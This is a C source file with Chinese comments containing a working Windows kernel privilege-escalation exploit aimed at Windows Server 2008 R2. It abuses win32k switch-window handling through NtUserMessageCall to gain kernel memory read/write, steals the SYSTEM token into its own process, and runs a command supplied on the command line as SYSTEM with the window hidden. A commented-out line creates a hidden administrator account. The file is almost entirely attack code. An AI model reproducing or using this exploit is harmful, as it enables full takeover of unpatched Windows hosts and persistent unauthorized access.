#include <stdio.h>
#include <windows.h>
#include <VersionHelpers.h>

#define _AFX_NO_MFC_CONTROLS_IN_DIALOGS
//#pragma comment(linker,"/ENTRY:main") //自己的主函数名为EntryPoint()
#pragma comment (linker,"/ALIGN:16") //内存
#pragma comment(linker,"/FILEALIGN:16") //硬盘
#pragma comment(linker, "/SECTION:.text,ERW")//指定节属性
#pragma comment(linker, "/merge:.rdata=.text")//合并节.rdata到.text
#pragma comment(linker, "/merge:.data=.text")//合并节.rdata到.text
#pragma comment(linker, "/IGNORE:4078")//忽略4078错误
#pragma comment(linker,"/OPT:REF") //清除从未引用的函数和/或数据
#pragma comment (linker, "/OPT:ICF")//从链接器输出中删除冗余COMDAT

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

extern "C" NTSTATUS NtUserMessageCall(HANDLE hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
extern "C" NTSTATUS NtUserDefSetText(HANDLE hWnd, PLARGE_UNICODE_STRING plstr);
extern "C" DWORD g_NtUserDefSetText_syscall = 0x1080, g_NtUserMessageCall_syscall = 0x1009;

#define SPARY_TIMES 0x1000

#ifdef _WIN64
typedef void*(NTAPI *lHMValidateHandle)(HANDLE h, int type); //声明一个函数类型指针NTAPI *lHMValidateHandle)：该类函数形参为(HANDLE h, int type)，返回值类型为void*。
#else
typedef void*(__fastcall *lHMValidateHandle)(HANDLE h, int type);
#endif
typedef NTSTATUS(__stdcall*RtlGetVersionT)(PRTL_OSVERSIONINFOW lpVersionInformation);

HWND g_hwnd = 0;
ULONG_PTR g_gap = 0;

lHMValidateHandle pHmValidateHandle = NULL; //lHMValidateHandle为函数指针，pHmValidateHandle也就为函数指针。

//查找HMValidateHandle句柄（即地址指针）：HMValidateHandle
BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		//printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu"); //检索导出函数IsMenu地址。IsMenu是BOOL lsMenu为原型的函数，用以确认一个句柄是否为菜单句柄。
	if (pIsMenu == NULL) { //不是菜单句柄。
		//printf("Failed to find location of exported function 'IsMenu' within user32.dll\n"); 
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) { //0xE8为call硬编码，IsMenu()中第一个call即是call HMValidateHandle。
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {//未能从“IsMenu”的位置找到HMValidateHandle的偏移量
		//	printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset); //函数HMValidateHandle的导出地址 = IsMenu的导出地址+偏移地址。
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr; //函数HMValidateHandle的偏移地址
																				  //The +11 is to skip the padding bytes as on Windows 10 these aren't nops
    //该函数运行完毕后，pHmValidateHandle即为函数 HMValidateHandle 地址。                                                                        
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11); //+11是为了跳过填充字节，比如win10上的那些不是nops空指令的。
	return TRUE;
}

//字符串初始化，用作字符串写入前的预处理。
VOID NTAPI RtlInitLargeUnicodeString(IN OUT PLARGE_UNICODE_STRING DestinationString, IN PCWSTR SourceString)
{
	ULONG DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWSTR)SourceString;
	DestinationString->bAnsi = FALSE;
}

//写入参数字符串，用于写入字符串数据。
void writedata(ULONG_PTR addr, ULONG_PTR data, ULONG size)
{
	SetClassLongPtr(g_hwnd, g_gap, addr);
	CHAR input[sizeof(ULONG_PTR) * 2];
	RtlSecureZeroMemory(&input, sizeof(input));
	LARGE_UNICODE_STRING u;
	for (int i = 0; i<sizeof(ULONG_PTR); i++)
	{
		input[i] = (data >> (8 * i)) & 0xff;
	}

	RtlInitLargeUnicodeString(&u, (PCWSTR)input);
	u.Length = size;
	u.MaximumLength = size;
	NtUserDefSetText(g_hwnd, &u);
}

//读取数据，用于读取相应的字符串。
ULONG_PTR readdata(ULONG_PTR addr)
{
	SetClassLongPtr(g_hwnd, g_gap, addr);
	ULONG_PTR temp[2] = { 0 };
	InternalGetWindowText(g_hwnd, (LPWSTR)temp, sizeof(temp) - sizeof(WCHAR));
	return temp[0];
}

int main()
{
	ULONG_PTR off_tagWND_pself = 0x20, off_tagCLS_extra = 0xa0, off_tagWND_tagCLS = 0x98, off_tagWND_strName = 0xe0; //ULONG_PTR :指针精度的无符号长型。是专门用于内核程序 (Kernel 或 Device Driver) 使用的数据类型。
	ULONG_PTR off_EPROCESS_Token = 0x348, off_KTHREAD_EPROCESS = 0x220, off_tagWND_parent = 0x58, off_tagWND_pti = 0x10;
	ULONG_PTR off_exp_tagCLS = 0;
	int argc = 0;
	wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc); //获取命令行参数

	if (!FindHMValidateHandle()) {//FindHMValidateHandle()用于获取函数 HMValidateHandle ()地址。
		printf("[!] Failed to locate HmValidateHandle, exiting\n"); //输出提示“找不到验证句柄”。
		return 1;
	}
    //win server2008 R2中内核窗体数据结构 tagWND 相关键值偏移地址。
	off_tagWND_pself = 0x20; //内核桌面堆地址即内核tagWND地址 = win32k!tagWND.head.pSelf（即 tagWND(用户桌面堆地址)+0x20）
	off_tagCLS_extra = 0xa0;
	off_tagWND_tagCLS = 0x98;
	off_tagWND_strName = 0xe0;
	off_KTHREAD_EPROCESS = 0x210;
	off_tagWND_parent = 0x58;
	off_EPROCESS_Token = 0x208;
	off_tagWND_pti = 0x10;
	g_NtUserDefSetText_syscall = 0x107f;
	g_NtUserMessageCall_syscall = 0x1007; //
	off_exp_tagCLS = 1; // stupid windows 2008

	ULONG_PTR base_alloc = 0xc00000;  //内存空间申请基地址

	ULONG_PTR target_addr = base_alloc << (8 * off_exp_tagCLS); //右移一个字节。

	ULONG_PTR temp = (ULONG_PTR)VirtualAlloc((LPVOID)target_addr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //VirtualAlloc() 申请虚拟内存。该函数的功能是在调用进程的虚地址空间,预定或者提交一部分页。

	if (temp != target_addr) //申请内存失败。
	{
		//printf("[!] Failed to map 0x%p (0x%p), exiting (%llx)\n", target_addr, temp, GetLastError());
		return 2;
	}

	target_addr = (base_alloc + 0x10000) << (8 * off_exp_tagCLS); //紧邻其后再次申请一个0x10000空间。
	temp = (ULONG_PTR)VirtualAlloc((LPVOID)target_addr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (temp != target_addr)//申请内存失败。
	{
		return 2;
	}

	const wchar_t CLASS_NAME[] = L"winname"; //定义窗口类名称,此处可变化。

	WNDCLASS wc; //WNDCLASS结构体存储窗口信息，CreateWindow只是将WNDCLASS定义的窗体变成实例。
	RtlSecureZeroMemory(&wc, sizeof(wc)); //RtlSecureZeroMemory为确保安全将指定区域进行置零。

	HINSTANCE hself = GetModuleHandle(0); //HINSTANCE 是“句柄型”数据类型。相当于装入到了内存的资源的ID。句柄实际上是一个 无符号长整数。但它是“句柄型”，所以你不能把它当成真的无符号长整数。
    //GetModuleHandle(0) 获取当前进程句柄

	wc.lpfnWndProc = DefWindowProc; //将lpfnWndProc指向一个具体的函数DefWindowProc，该函数的功能是处理默认窗口过程。
	wc.hInstance = hself;           //类的窗口过程的实例句柄。
	wc.lpszClassName = CLASS_NAME;  //窗口类名称
	wc.cbWndExtra = 0x3000; //窗口实例之后要分配的额外字节数。
	wc.cbClsExtra = 0x3000;//根据窗口类结构分配的额外字节数。

	RegisterClass(&wc);//注册窗口类，以供CreateWindow或CreateWindowEx函数的调用。
	HWND hwnd; //窗口类句柄

	ULONG_PTR tagWND = 0, tagCLS = 0;
	INT64 gap = 0;

	while (true)
	{
        //创建窗口实例
		hwnd = CreateWindowEx(0, CLASS_NAME, L"winname", 0, 0, 0, 0, 0, NULL, NULL, hself, NULL);
		if (hwnd == NULL) //创建窗口失败
		{
			return 3;
		}

		char* lpUserDesktopHeapWindow = (char*)pHmValidateHandle(hwnd, 1); //查找内核窗体数据结构tagWND地址。
		tagWND = *(ULONG_PTR*)(lpUserDesktopHeapWindow + off_tagWND_pself); //tagWND自身地址。
		tagCLS = *(ULONG_PTR*)(lpUserDesktopHeapWindow + off_tagWND_tagCLS); //tagCLS地址。

		gap = tagWND - tagCLS; //缺口大小，即相对偏移地址
		if (gap>0 && gap<0x100000)
		{
			break;
		}
	}
    //以上窗口创建操作用于查找tagWND、tagCLS及计算gap。
	//printf("[*] tagWND: 0x%p, tagCLS:0x%p, gap:0x%llx\n", tagWND, tagCLS, gap);

	WNDCLASSEX wcx; //该结构体类同WNDCLASS。
	RtlSecureZeroMemory(&wcx, sizeof(wcx)); //置零
	wcx.hInstance = hself;  //类的窗口过程的实例句柄。
	wcx.cbSize = sizeof(wcx); 
	wcx.lpszClassName = L"SploitWnd";//定义窗口类名称,此处可变化。
	wcx.lpfnWndProc = DefWindowProc;//将lpfnWndProc指向一个具体的函数DefWindowProc，该函数的功能是处理默认窗口过程。
	wcx.cbWndExtra = 8; //pass check in xxxSwitchWndProc to set wnd->fnid = 0x2A0 (用于跳过xxxSwitchWndProc的相关判断语句；这里可以是8或更大的数)

	ATOM wndAtom = RegisterClassEx(&wcx); //注册窗口
	if (wndAtom == INVALID_ATOM) { //注册失败
		exit(-1);
	}

	//创建窗口实例
	HWND sploitWnd = CreateWindowEx(0, L"SploitWnd", L"", WS_VISIBLE, 0, 0, 0, 0, NULL, NULL, hself, NULL);
	if (sploitWnd == INVALID_HANDLE_VALUE) {//创建窗口实例失败；字符串“SploitWnd”可变化。
		exit(-1);
	}
	//printf("[*] Calling NtUserMessageCall to set fnid = 0x2A0 on window 0x%p\n", sploitWnd);
    //第一次调用NtUserMessageCall设置窗口属性值fnid = 0x2A0。WM_CREATE/* = 1*/ 用于跳过xxxSwitchWndProc的相关判断语句。
	NtUserMessageCall(sploitWnd, WM_CREATE/* = 1*/, 0, 0, 0, 0xE0/*0x0也一样*/, 1);

	//printf("[*] Calling SetWindowLongPtr to set window extra data, that will be later dereferenced\n");
    //调用SetWindowLongPtr设置窗口额外数据，稍后该数据将被间接引用。//设置extra-WndData，即指定被写数据地址。
	SetWindowLongPtr(sploitWnd, 0, tagCLS - off_exp_tagCLS)

	//printf("[*] Creating switch window #32771, this has a result of setting (gpsi+0x154) = 0x130\n");
    //创建一个切换窗口，这将会使得(gpsi+0x154) = 0x130，并且无法再次设0，所以该EXP之后一次运行机会。
	HWND switchWnd = CreateWindowEx(0, (LPCWSTR)0x8003, L"", 0, 0, 0, 0, 0, NULL, NULL, hself, NULL);

	//printf("[*] Simulating alt key press\n");
    //模拟按下ALT键。 
	BYTE keyState[256];
	GetKeyboardState(keyState); //获取虚拟键盘状态。-->USER32!NtUserGetKeyboardState
	keyState[VK_MENU] |= 0x80;
	SetKeyboardState(keyState); //设置虚拟键盘状态. -->USER32!ZwUserSetKeyboardState
	/*	keybd_event(VK_MENU, 0, 0, 0);*/
	//printf("[*] Triggering dereference of wnd->extraData by calling NtUserMessageCall second time\n");
    //第二次调用NtUserMessageCall触发对wnd->extraData的引用。即，使xxxSwitchWndProc函数流程走到存在漏洞的xxxPaintSwitchWindow中。
	NtUserMessageCall(sploitWnd, WM_ERASEBKGND/* = 0x14*/, 0, 0, 0, 0x0, 1);

	// now cbCLSExtra is very large
    //现在窗体分配的额外字节是很大的
	// verify the oob read
    //验证OOB读取是否正确
	ULONG_PTR orig_name = SetClassLongPtr(hwnd, gap - off_tagCLS_extra + off_tagWND_strName, tagWND + off_tagWND_pself);//SetClassLongPtr()用参数3替换指定窗口参数1的参数2处的值。
	ULONG_PTR testtagWND[2] = { 0 };
	InternalGetWindowText(hwnd, (LPWSTR)testtagWND, sizeof(ULONG_PTR)); //获取窗口标题，保存在testtagWND。

	if (testtagWND[0] == tagWND) //若当前窗口标题与tagWND地址相同
	{
		ULONG_PTR tagExpWnd = *(ULONG_PTR*)((char*)pHmValidateHandle(sploitWnd, 1) + off_tagWND_pself);//获取第二个窗口实例的tagWND地址。
		//printf("[*] tagWND: 0x%p\n", tagExpWnd);
		//printf("[+] Exploit success!\n");
		// fix tagCLS
        //赋值tagCLS的值
		g_hwnd = hwnd;
		g_gap = gap - off_tagCLS_extra + off_tagWND_strName;

		writedata(tagExpWnd + 0x40, 0, 4); //向tagExpWnd + 0x40写入数据。
		writedata(tagCLS + 0x68, (ULONG_PTR)hself, 8); //向tagCLS+ 0x68写入数据。
		writedata(tagCLS + 0x58, (ULONG_PTR)DefWindowProc, 8);//向tagExpWnd+ 0x58写入数据。

		ULONG_PTR token = readdata(readdata(readdata(readdata(readdata(tagWND + off_tagWND_parent) + off_tagWND_pti)) + off_KTHREAD_EPROCESS) + off_EPROCESS_Token); //读取system权限token
		ULONG_PTR ep = readdata(readdata(readdata(tagWND + off_tagWND_pti)) + off_KTHREAD_EPROCESS); // 自身EP进程地址
		ULONG_PTR temp = readdata(ep + off_EPROCESS_Token + sizeof(ULONG_PTR)); //修复工作集页
		writedata(ep + off_EPROCESS_Token, token, 8); //替换token进行提权。
		writedata(ep + off_EPROCESS_Token + sizeof(ULONG_PTR), temp, 8);

		// fix tagWND
        //赋值tagWND的值
		SetClassLongPtr(hwnd, g_gap, orig_name);

		DestroyWindow(hwnd); //销毁窗口
		g_hwnd = 0;
		DestroyWindow(sploitWnd);//销毁窗口
		UnregisterClass(CLASS_NAME, 0);//释放资源
		UnregisterClass(L"SploitWnd", 0);//释放资源

		SECURITY_ATTRIBUTES		sa;     //安全属性
		HANDLE					hRead, hWrite;
		byte					buf[40960] = { 0 };
		STARTUPINFOW			si; //启动信息
		PROCESS_INFORMATION		pi; //用来接收新进程信息
		DWORD					bytesRead;
		RtlSecureZeroMemory(&si, sizeof(si)); //相关空间清零
		RtlSecureZeroMemory(&pi, sizeof(pi)); //相关空间清零
		RtlSecureZeroMemory(&sa, sizeof(sa)); //相关空间清零
		int br = 0;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL; //长整型指针，安全描述符。
		sa.bInheritHandle = TRUE;   //继承句柄
		if (!CreatePipe(&hRead, &hWrite, &sa, 0)) //创建一个管道，并将句柄返回到该管道的读取和写端。
		{
			return -3;
		}
		//printf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
        //尝试用system执行传入参数命令。
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfoW(&si); //获取进程启动时的STARTUPINFO。
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		//si.lpDesktop = L"WinSta0\\Default";//用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。如果lpDesktop是NULL（这是最常见的情况),那么该进程将与当前桌面相关联。
        si.lpDesktop = NULL;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //显示窗口或隐藏窗口都可以。
		//wchar_t cmd[4096] = (wchar_t)"net user admin1 111PASSset /add & net localgroup Administrators admin1 /add";
		wchar_t cmd[4096] = {0};
		lstrcpyW(cmd, argv[1]);
		if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		{
			CloseHandle(hWrite);
			CloseHandle(hRead);
			//printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
			return -2;
		}
		CloseHandle(hWrite);
		//printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
		while (1) //读取命令执行完毕后的返回结果。
		{
			if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
				break;
			br += bytesRead;
		}
		//puts("===============================");
		puts((char*)buf);
		fflush(stdout); //冲洗缓冲区，使之立马打印到屏幕。
		fflush(stderr); //冲洗缓冲区，使之立马打印到屏幕。
		CloseHandle(hRead);
		CloseHandle(pi.hProcess);
		ExitProcess(0);
	}
	else
	{
		//printf("[!] Exploit fail, test:0x%p,tagWND:0x%p, error:0x%lx\n", testtagWND, tagWND, GetLastError());
		ExitProcess(-5);
	}
}